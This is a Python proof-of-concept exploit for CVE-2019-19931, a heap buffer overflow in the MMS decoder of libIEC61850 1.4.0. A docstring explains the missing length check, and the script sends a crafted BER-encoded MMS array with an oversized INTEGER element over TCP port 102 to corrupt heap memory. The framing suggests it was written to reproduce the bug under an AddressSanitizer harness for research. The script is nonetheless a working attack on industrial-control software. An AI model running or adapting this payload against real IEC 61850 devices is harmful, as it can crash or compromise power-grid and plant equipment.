#!/usr/bin/env python3
"""
CVE-2019-19931 PoC - libIEC61850 1.4.0 heap buffer overflow (WRITE) in
MmsValue_decodeMmsData() reached through the nested MMS_ARRAY/MMS_STRUCTURE
element-recursion path (libiec61850 issue #194,
"WRITE of N bytes to a 9-byte region").

ROOT CAUSE (real v1.4.0 src/mms/iso_mms/server/mms_access_result.c):

    case 0x85: /* MMS_INTEGER */
        value = MmsValue_newInteger(dataLength * 8);          /* line 231 */
        memcpy(value->value.integer->octets,
               buffer + bufPos, dataLength);                  /* line 232 <-- OVERFLOW */

v1.4.0 has NO `if (dataLength > 8) goto exit_with_error;` guard on the INTEGER
(0x85) / UNSIGNED (0x86) branch (that guard was added post-1.4.0). For any
dataLength > 8, MmsValue_newInteger(dataLength*8) routes to BerInteger_createInt64()
which CALLOCs a fixed 9-byte octets region, but the subsequent memcpy copies the
attacker-declared `dataLength` bytes. dataLength = 12 -> "WRITE of size 12 to a
9-byte region", the exact issue-#194 shape.

This is DISTINCT from CVE-2020-7054 (the MMS_BIT_STRING 0x84 padding overflow,
a different decoder branch / different sink). To make the element-recursion path
unambiguous, the oversized INTEGER is delivered as the single element of an MMS
array (0xa1) so the ASan trace shows MmsValue_decodeMmsData TWICE:
    #1 MmsValue_decodeMmsData mms_access_result.c:232   (child INTEGER memcpy)
    #2 MmsValue_decodeMmsData mms_access_result.c:194   (parent array element loop)

Wire framing for the real-CVE harness (mms_cve_2019_19931_real.c):
    [4-byte big-endian length L][L bytes of raw MMS Data element]
The L bytes are fed verbatim to MmsValue_decodeMmsData(buffer, 0, L, &endBufPos).
Everything here is self-consistent and fully in-frame -- no out-of-frame length
games (BerDecoder_decodeLength would reject those); the bug is an alloc(9) vs
copy(dataLength) SIZE mismatch.

Usage: python3 mms_cve_2019_19931_real_poc.py [host] [port]
"""
import socket
import struct
import sys

host = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
port = int(sys.argv[2]) if len(sys.argv) > 2 else 102


def ber_len(n: int) -> bytes:
    """BER definite length encoding."""
    if n < 0x80:
        return bytes([n])
    out = b""
    while n:
        out = bytes([n & 0xFF]) + out
        n >>= 8
    return bytes([0x80 | len(out)]) + out


def send(payload: bytes, label: str) -> None:
    print(f"[*] {label}: {len(payload)} B {payload.hex()}")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(5)
    s.connect((host, port))
    s.sendall(struct.pack(">I", len(payload)) + payload)
    try:
        s.recv(64)
    except Exception:
        pass
    s.close()


def main() -> None:
    # Inner element: MMS_INTEGER (0x85) with dataLength = 12. newInteger(12*8=96)
    # -> Int64 -> 9-byte octets buffer, but the memcpy copies 12 bytes -> heap
    # overflow WRITE of 12 into a 9-byte region.
    DATALEN = 12  # > 8, so Int64's 9-byte octets buffer is overflowed by 3 bytes
    inner = bytes([0x85]) + ber_len(DATALEN) + b"\x41" * DATALEN
    # Wrap in an MMS_ARRAY (0xa1) so the overflow fires inside the element
    # recursion -> ASan trace shows MmsValue_decodeMmsData twice (child:232 /
    # parent:194), proving the nested-element path (distinct from 2020-7054).
    payload = bytes([0xA1]) + ber_len(len(inner)) + inner
    send(payload, "nested ARRAY -> INTEGER memcpy overflow (WRITE 12 -> 9-byte region)")
    print("[*] sent (expect ASan heap-buffer-overflow WRITE in MmsValue_decodeMmsData:232)")


if __name__ == "__main__":
    main()
